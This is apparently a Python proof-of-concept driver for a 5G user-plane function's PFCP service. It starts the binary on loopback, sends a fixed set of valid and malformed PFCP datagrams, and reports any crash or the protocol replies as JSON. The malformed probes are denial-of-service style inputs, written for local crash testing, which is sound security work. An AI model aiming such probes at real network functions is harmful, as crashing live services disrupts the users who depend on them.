#!/usr/bin/env python3
"""PoC driver for the `upf` PFCP network service.

Starts the service with a dynamically generated config, probes its PFCP
UDP endpoint on 127.0.0.1:8805 with a deterministic sequence of datagrams,
and reports the observed outcome (crash or protocol transcript) as JSON.

Only Python's standard library is used.
"""

import argparse
import json
import os
import shutil
import signal
import socket
import struct
import subprocess
import sys
import tempfile
import time

PFCP_PORT = 8805
PFCP_ADDR = ("127.0.0.1", PFCP_PORT)

CONFIG_TEMPLATE = """{
  // Minimal config for the UPF in af_packet mode on loopback.
  "mode": "af_packet",
  "access": { "ifname": "lo" },
  "core": { "ifname": "lo" },
  "cpiface": { "hostname": "", "http_port": "0", "dnn": "internet" },
  "n4_addr": "127.0.0.1",
  "resp_timeout": "2s",
  "read_timeout": 15,
  "log_level": "info"
}
"""


def pfcp_header(msg_type, seq, seid=None):
    """Build a PFCP header (version 1)."""
    if seid is None:
        return struct.pack("!BBH", 0x20, msg_type, 4) + seq.to_bytes(3, "big") + b"\x00"
    return struct.pack("!BBHQ", 0x21, msg_type, 12, seid) + seq.to_bytes(3, "big") + b"\x00"


def build_probes():
    """Deterministic probe datagrams exercising PFCP input handling."""
    # Recovery Time Stamp IE (type 96, 4-byte NTP-ish value).
    rts = struct.pack("!HHI", 96, 4, 1700000000)
    # Node ID IE (type 60): IPv4 address 127.0.0.1.
    node_id = struct.pack("!HHB", 60, 5, 0) + socket.inet_aton("127.0.0.1")
    # UP Function Features IE (type 43, length 1).
    up_features = struct.pack("!HHB", 43, 1, 0)
    return [
        ("heartbeat_request", pfcp_header(1, 1) + rts),
        ("association_setup_request", pfcp_header(5, 2) + node_id + rts + up_features),
        ("heartbeat_request_after_setup", pfcp_header(1, 3) + rts),
        ("truncated_header", b"\x20"),
        ("random_garbage", bytes(range(64))),
        ("bad_version_header", b"\xe0\x01\x00\x04\x00\x00\x01\x00"),
        ("unknown_msg_type", pfcp_header(0x63, 4)),
        ("session_request_no_assoc", pfcp_header(50, 5, seid=0xDEADBEEF) + node_id),
    ]


def wait_ready(proc, sock, probes, deadline):
    """Send heartbeat probes until a reply arrives or the deadline passes."""
    heartbeat = probes[0][1]
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            return False
        try:
            sock.sendto(heartbeat, PFCP_ADDR)
            sock.settimeout(0.25)
            sock.recvfrom(4096)
            return True
        except socket.timeout:
            continue
        except OSError:
            time.sleep(0.1)
    return False


def main():
    parser = argparse.ArgumentParser(description="PoC driver for the upf PFCP service")
    parser.add_argument("--binary", required=True, help="path to the upf binary")
    parser.add_argument("--json-out", default=None, help="write result JSON to this path")
    parser.add_argument("--timeout", type=float, default=10.0,
                        help="observation window in seconds (default 10)")
    args = parser.parse_args()

    start = time.monotonic()
    result = {
        "binary": args.binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "protocol_transcript", "value": "no_response", "path": None},
        "error": None,
    }

    proc = None
    tmpdir = None
    try:
        binary = os.path.abspath(args.binary)
        result["binary"] = args.binary
        if not os.path.isfile(binary) or not os.access(binary, os.X_OK):
            result["error"] = "binary not found or not executable: %s" % args.binary
            return finish(result, args, start)

        tmpdir = tempfile.mkdtemp(prefix="upf_poc_")
        config_path = os.path.join(tmpdir, "upf.jsonc")
        with open(config_path, "w") as fh:
            fh.write(CONFIG_TEMPLATE)

        command = [binary, "-config", config_path]
        result["command"] = command
        proc = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            errors="replace",
        )

        probes = build_probes()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            ready_deadline = time.monotonic() + min(max(args.timeout, 1.0), 15.0)
            if not wait_ready(proc, sock, probes, ready_deadline):
                if proc.poll() is not None:
                    result["error"] = "service exited before the listener became ready"
                else:
                    result["error"] = "listener on 127.0.0.1:%d never became ready" % PFCP_PORT
                return finish(result, args, start, proc=proc)

            transcript_lines = []
            crashed = False
            probe_deadline = time.monotonic() + max(args.timeout, 1.0)
            for name, payload in probes:
                if time.monotonic() > probe_deadline:
                    break
                if proc.poll() is not None:
                    crashed = True
                    transcript_lines.append("%s: process_exited rc=%s" % (name, proc.returncode))
                    break
                try:
                    sock.sendto(payload, PFCP_ADDR)
                    sock.settimeout(1.5)
                    reply, _ = sock.recvfrom(65535)
                    transcript_lines.append("%s sent=%s reply=%s" % (name, payload.hex(), reply.hex()))
                except socket.timeout:
                    transcript_lines.append("%s sent=%s reply=no_response" % (name, payload.hex()))
                # Short settle window to let any deferred crash surface.
                time.sleep(0.15)
                if proc.poll() is not None:
                    crashed = True
                    transcript_lines.append("%s: process_exited_after_probe rc=%s" % (name, proc.returncode))
                    break

            # Final settle: give the service a moment in case the last probe
            # triggers asynchronous processing before it dies.
            if proc.poll() is None:
                settle_end = time.monotonic() + min(1.0, max(args.timeout, 0.5))
                while time.monotonic() < settle_end and proc.poll() is None:
                    time.sleep(0.05)
            if proc.poll() is not None:
                crashed = True

            stdout_text, stderr_text = collect_output(proc)
            result["stdout"] = stdout_text
            result["stderr"] = stderr_text

            if crashed:
                result["timed_out"] = False
                rc = proc.returncode
                if rc is not None and rc < 0:
                    result["signal"] = signal.Signals(-rc).name
                    result["returncode"] = -rc
                else:
                    result["returncode"] = rc
                combined = (stderr_text or "") + "\n" + (stdout_text or "")
                trace = combined.strip()
                idx = trace.find("panic:")
                if idx >= 0:
                    trace = trace[idx:]
                result["observable"] = {"kind": "crash_trace", "value": trace, "path": None}
            else:
                transcript = "\n".join(transcript_lines) if transcript_lines else "no_response"
                result["observable"] = {
                    "kind": "protocol_transcript",
                    "value": transcript,
                    "path": None,
                }
                # Service is still running; terminate it as required.
                result["timed_out"] = True
                terminate(proc)
                stdout_text, stderr_text = collect_output(proc)
                result["stdout"] = stdout_text
                result["stderr"] = stderr_text
                result["returncode"] = proc.returncode
                result["signal"] = None
        finally:
            sock.close()
        return finish(result, args, start)
    except Exception as exc:  # noqa: BLE001 - report own failures in the contract
        result["error"] = "driver exception: %s: %s" % (type(exc).__name__, exc)
        return finish(result, args, start, proc=proc)
    finally:
        if proc is not None and proc.poll() is None:
            terminate(proc)
        if tmpdir is not None:
            shutil.rmtree(tmpdir, ignore_errors=True)


def collect_output(proc):
    """Read captured stdout/stderr without blocking."""
    try:
        if proc.poll() is None:
            return "", ""
        out, err = proc.communicate(timeout=5)
        return out or "", err or ""
    except Exception:
        return "", ""


def terminate(proc):
    """Terminate the target process, escalating to SIGKILL if needed."""
    if proc.poll() is not None:
        return
    try:
        proc.terminate()
        proc.wait(timeout=5)
    except Exception:
        try:
            proc.kill()
            proc.wait(timeout=5)
        except Exception:
            pass


def finish(result, args, start, proc=None):
    if proc is not None:
        if proc.poll() is None:
            terminate(proc)
        # Final capture of anything left in the pipes.
        out, err = collect_output(proc)
        if out and out not in result["stdout"]:
            result["stdout"] = (result["stdout"] + out)
        if err and err not in result["stderr"]:
            result["stderr"] = (result["stderr"] + err)
        if result["returncode"] is None:
            rc = proc.returncode
            if rc is not None and rc < 0:
                result["signal"] = signal.Signals(-rc).name
                result["returncode"] = -rc
            else:
                result["returncode"] = rc
    result["runtime_ms"] = int((time.monotonic() - start) * 1000)
    payload = json.dumps(result, indent=2)
    if args.json_out:
        out_dir = os.path.dirname(os.path.abspath(args.json_out))
        if out_dir:
            os.makedirs(out_dir, exist_ok=True)
        with open(args.json_out, "w") as fh:
            fh.write(payload + "\n")
    else:
        print(payload)
    return 0


if __name__ == "__main__":
    sys.exit(main())
